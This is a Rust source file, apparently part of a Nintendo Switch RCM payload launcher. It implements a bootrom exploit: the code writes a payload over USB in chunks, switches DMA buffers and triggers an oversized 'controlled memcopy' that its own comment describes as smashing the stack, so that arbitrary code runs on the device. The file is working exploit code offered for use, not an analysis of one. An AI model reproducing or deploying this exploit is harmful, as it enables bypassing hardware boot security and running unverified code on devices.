use log::{debug, trace};

use super::buffer::BufferState;
use crate::error::Result;
use crate::exploit::Exploit;
use crate::payload::Payload;
use crate::usb::{DeviceHandle, SwitchHandle};

/// An RCM connection handle
#[derive(Debug)]
pub(crate) struct RcmHandle {
    handle: SwitchHandle,
    current_buffer: BufferState,
    total_written: usize,
}

impl RcmHandle {
    /// Create a RcmHandle from a switch handle
    pub(crate) fn new(switch_handle: SwitchHandle) -> Self {
        Self {
            handle: switch_handle,
            current_buffer: BufferState::Low,
            total_written: 0,
        }
    }

    /// Execute the payload on the connected device
    pub(crate) fn execute_payload(mut self, payload: &Payload) -> Result<()> {
        let device_id = self.read_device_id()?;
        trace!("Device ID: {:?}", device_id);

        self.write(payload.data())?;
        self.switch_to_highbuf()?;

        // Smash the stack
        self.trigger_controlled_memcopy()
    }

    /// Reads the device ID
    ///
    /// Note: This is a REQUIRED step before executing
    fn read_device_id(&mut self) -> Result<[u8; 16]> {
        let mut buf = [b'\0'; 16];
        self.read(&mut buf)?;
        Ok(buf)
    }

    /// Writes data to the RCM protocol endpoint
    fn write(&mut self, buf: &[u8]) -> Result<usize> {
        const PACKET_SIZE: usize = 0x1000;
        const MAX_LENGTH: usize = 0x30298;

        assert!(buf.len() <= MAX_LENGTH);

        let mut remaining_buf = buf;
        let mut length_remaining = buf.len();

        let mut written = 0;

        while length_remaining != 0 {
            let data_to_transmit = length_remaining.min(PACKET_SIZE);
            length_remaining -= data_to_transmit;

            let chunk = &remaining_buf[..data_to_transmit];
            remaining_buf = &remaining_buf[data_to_transmit..];
            match self.write_buffer(chunk) {
                Ok(size) => written += size,
                Err(e) => return Err(e),
            };
        }
        // update the current amount of bytes written
        self.total_written += written;

        Ok(written)
    }

    fn switch_to_highbuf(&mut self) -> Result<()> {
        if self.current_buffer != BufferState::High {
            let buf = &[b'\0'; 0x1000];
            self.write(buf)?;
        }
        Ok(())
    }

    fn trigger_controlled_memcopy(&self) -> Result<()> {
        const STACK_END: usize = 0x40010000;
        debug!(
            "Wrote a total of {} bytes to the switch, performing the controlled memcopy",
            self.total_written
        );

        let length = STACK_END - self.current_buffer.address();
        self.handle.trigger(length)?;
        Ok(())
    }

    fn write_buffer(&mut self, buf: &[u8]) -> Result<usize> {
        self.current_buffer.toggle();
        let written = self.handle.write(buf)?;
        Ok(written)
    }

    /// Read from the device
    /// Returns bytes read
    fn read(&mut self, buf: &mut [u8]) -> Result<usize> {
        let read = self.handle.read(buf)?;
        Ok(read)
    }
}
